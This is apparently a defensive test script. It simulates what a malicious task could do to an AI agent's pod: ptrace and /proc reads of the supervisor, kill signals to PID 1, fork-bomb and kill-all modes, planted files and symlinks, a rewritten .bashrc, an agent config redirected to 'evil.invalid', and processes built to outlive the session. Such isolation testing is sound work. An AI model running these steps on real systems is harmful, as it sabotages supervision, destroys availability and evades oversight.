# What a malicious task could do in a single-container pod (everything the
# agent's user can). Run inside the pod as the agent would; prints key=value.
import ctypes, os, signal, subprocess, sys, time

libc = ctypes.CDLL(None, use_errno=True)
libc.ptrace.restype = ctypes.c_long
MODE = sys.argv[1] if len(sys.argv) > 1 else "plant"


def r(key, val):
    print(f"{key}={val}", flush=True)


def pid1_state():
    return open("/proc/1/stat").read().rsplit(")", 1)[1].split()[0]


# 1. Read or trace the supervisor (PID 1).
r("ptrace_pid1", "ALLOWED" if libc.ptrace(16, 1, 0, 0) == 0 else os.strerror(ctypes.get_errno()))
for f in ("mem", "environ", "maps", "cmdline_fd"):
    try:
        if f == "cmdline_fd":
            os.listdir("/proc/1/fd")
        else:
            open(f"/proc/1/{f}", "rb").read(1)
        r(f"read_proc1_{f}", "ALLOWED")
    except OSError as e:
        r(f"read_proc1_{f}", os.strerror(e.errno))

# 2. Overwrite the supervisor binary.
try:
    open("/usr/local/bin/pod-supervisor", "ab").close()
    r("write_supervisor_binary", "ALLOWED")
except OSError as e:
    r("write_supervisor_binary", os.strerror(e.errno))

# 3. Signal PID 1 with everything that could stop it (not SIGTERM/SIGINT, which
# only restart the container).
for s in (signal.SIGKILL, signal.SIGSTOP, signal.SIGHUP, signal.SIGQUIT, signal.SIGUSR1, signal.SIGUSR2, signal.SIGABRT, signal.SIGALRM):
    os.kill(1, s)
time.sleep(1.5)
r("pid1_alive_after_signals", os.path.exists("/proc/1/stat") and pid1_state() != "T")

# 4. The daemon is the agent's user: tracing it is possible (documented).
for d in os.listdir("/proc"):
    if d.isdigit():
        try:
            cmd = open(f"/proc/{d}/cmdline", "rb").read().split(b"\0")
        except OSError:
            continue
        if cmd[:3] == [b"/usr/local/bin/multica", b"daemon", b"start"]:
            ok = libc.ptrace(16, int(d), 0, 0) == 0
            r("ptrace_daemon", "ALLOWED" if ok else os.strerror(ctypes.get_errno()))
            if ok:
                os.waitpid(int(d), 0)
                libc.ptrace(17, int(d), 0, 0)

if MODE == "forkbomb":
    # Fill the pod's pid limit with processes that outlive their parent.
    r("forkbomb", "forking until the pids limit")
    while True:
        try:
            if os.fork() == 0:
                os.setsid()
                os.execvp("sleep", ["sleep", "7777"])
        except OSError:
            time.sleep(0.05)

if MODE == "killall":
    r("killall", "sending kill(-1, SIGKILL)")
    os.kill(-1, signal.SIGKILL)
    time.sleep(60)
    sys.exit(0)

# 5. Leave things behind, everywhere, for the next task.
home = "/home/pod"  # the daemon gives agents this HOME; kubectl exec does not
for d in ("/work", "/tmp", "/dev/shm", home):
    open(f"{d}/canary-file", "w").write("task-1 secret")
os.makedirs("/work/locked/inner", exist_ok=True)
open("/work/locked/inner/canary-file", "w").write("x")
os.chmod("/work/locked/inner", 0o000)
os.chmod("/work/locked", 0o000)
os.makedirs("/tmp/ro/a/b", exist_ok=True)
open("/tmp/ro/a/b/canary-file", "w").write("x")
for p in ("/tmp/ro/a/b", "/tmp/ro/a", "/tmp/ro"):
    os.chmod(p, 0o500)
os.symlink("/", "/work/canary-link-root")
os.symlink("/work", "/tmp/canary-link-loop")
os.link("/work/canary-file", "/work/canary-hardlink")
os.mkfifo("/tmp/canary-fifo")
deep = "/work/deep"
os.makedirs(deep, exist_ok=True)
fd = os.open(deep, os.O_RDONLY)
for _ in range(400):  # a path far longer than PATH_MAX
    os.mkdir("d" * 8, dir_fd=fd)
    nfd = os.open("d" * 8, os.O_RDONLY, dir_fd=fd)
    os.close(fd)
    fd = nfd
open("canary-file", "w", opener=lambda p, f: os.open(p, f, dir_fd=fd)).write("x")
os.close(fd)
open(f"{home}/.bashrc", "w").write("echo task-1 was here\n")
os.makedirs(f"{home}/.multica", exist_ok=True)
open(f"{home}/.multica/config.json", "w").write('{"server_url":"http://evil.invalid","token":"x"}')

# 6. Processes that try to outlive the task.
sh = "sh"
subprocess.Popen([sh, "-c", "while :; do sleep 7777 & sleep 1; done"], start_new_session=True,
                 stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
subprocess.Popen([sh, "-c", "trap '' TERM HUP INT; sleep 7777"], start_new_session=True,
                 stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
if os.fork() == 0:  # double-forked daemon that keeps forking, up to 300 children
    os.setsid()
    if os.fork() == 0:
        for _ in range(15):
            for _ in range(20):
                if os.fork() == 0:
                    os.execvp("sleep", ["sleep", "7777"])
            time.sleep(0.2)
        time.sleep(7777)
    os._exit(0)
r("planted", "files, locked and deep trees, links, respawning processes")
